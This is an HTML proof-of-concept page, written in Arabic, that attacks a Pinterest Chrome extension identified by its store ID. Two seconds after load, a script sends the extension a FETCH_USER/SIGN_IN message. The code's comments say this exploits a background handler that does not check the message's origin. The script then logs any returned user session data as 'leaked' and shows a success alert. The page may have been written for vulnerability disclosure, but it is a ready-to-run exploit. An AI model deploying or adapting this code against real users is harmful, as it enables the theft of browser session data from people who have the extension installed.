<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinterest Extension Exploit PoC</title>
    <style>
        :root { --pinterest-red: #e60023; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fafafa; color: #333; display: flex; flex-direction: column; align-items: center; padding: 40px; }
        .card { background: white; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); padding: 30px; max-width: 500px; text-align: center; }
        h1 { color: var(--pinterest-red); font-size: 24px; }
        .img-wrapper { margin: 20px 0; position: relative; display: inline-block; }
        img { width: 100%; border-radius: 12px; border: 2px solid #eee; transition: 0.3s; }
        img:hover { border-color: var(--pinterest-red); transform: translateY(-5px); }
        .console-box { background: #222; color: #0f0; padding: 15px; border-radius: 8px; text-align: left; font-family: monospace; font-size: 12px; overflow-x: auto; margin-top: 20px; min-height: 50px; }
        .badge { background: #eee; padding: 5px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Pinterest PoC Test</h1>
        <p>هذه الصفحة تختبر ثغرة <strong>External Message Leakage</strong></p>
        
        <div class="badge">Target ID: gpdjojdkbbmdfjfahjcgigfpmkopogic</div>

        <div class="img-wrapper">
            <img src="https://picsum.photos/400/300?random=1" alt="Exploit Trigger Image">
            <p style="font-size: 12px; color: #666;">(مرر الماوس فوق الصورة لتنشيط الإضافة)</p>
        </div>

        <div class="console-box" id="output">
            > في انتظار استجابة الإضافة...
        </div>
    </div>

    <script>
        // المعرف الرسمي للإضافة من متجر كروم
        const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";
        const output = document.getElementById('output');

        function log(msg, data = null) {
            output.innerHTML = `> ${msg}`;
            if (data) {
                console.log("[!] Data Leaked:", data);
                output.innerHTML += `<br><span style="color: yellow;">[تم العثور على بيانات - تفقد Console]</span>`;
            }
        }

        async function triggerExploit() {
            // التحقق من وجود المتصفح يدعم التواصل مع الإضافات
            if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
                
                log("جاري محاولة سحب بيانات المستخدم...");

                // إرسال رسالة مباشرة إلى خلفية الإضافة (Background Script)
                // نحن نستغل دالة gr() التي لا تتحقق من مصدر الرسالة
                chrome.runtime.sendMessage(EXTENSION_ID, {
                    action: "FETCH_USER",
                    type: "SIGN_IN"
                }, (response) => {
                    if (chrome.runtime.lastError) {
                        log("خطأ: " + chrome.runtime.lastError.message + " (تأكد من تثبيت الإضافة)");
                    } else if (response) {
                        log("نجاح! تم تسريب البيانات:", response);
                        alert("نجح الاختراق! تم سحب بيانات الجلسة من إضافة Pinterest.\nتفقد المتصفح Console لرؤية التفاصيل.");
                    } else {
                        log("تم إرسال الرسالة ولكن لم يتم إرجاع بيانات. (قد لا تكون مسجلاً للدخول)");
                    }
                });

            } else {
                log("المتصفح لا يدعم sendMessage.");
            }
        }

        // تشغيل المحاولة بعد ثانيتين لضمان تحميل الإضافة تماماً
        setTimeout(triggerExploit, 2000);
    </script>
</body>
</html>
